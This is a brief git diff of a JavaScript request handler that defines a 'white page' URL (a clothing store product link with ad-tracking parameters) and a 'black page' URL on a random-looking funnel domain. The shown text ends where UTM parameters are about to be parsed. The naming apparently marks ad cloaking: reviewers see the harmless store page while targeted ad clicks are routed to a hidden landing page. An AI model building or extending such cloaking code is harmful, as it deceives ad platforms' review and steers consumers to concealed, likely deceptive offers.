@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.dreamdrapes.com/custom-linen-drapes.html";
+    const whitePageURL = "https://urban-maple.com/products/xavier-patchwork-vanguard-sweater?variant=55466503700829&country=CA&currency=CAD&utm_medium=product_sync&utm_source=google&utm_content=sag_organic&utm_campaign=sag_organic&utm_campaign=21956401326&utm_ad_group=&utm_ad=&utm_source=google&gad_source=1&gclid=EAIaIQobChMI4OOyt7eliwMViB6tBh0oSgteEAQYBCABEgKyovD_BwE";
     const blackPageURL = "https://dnfiwbzxjq.myfunnelish.com/imbassd-1736979042571105-1737834191248667";
   
     // Parse the UTM parameters from the request URL
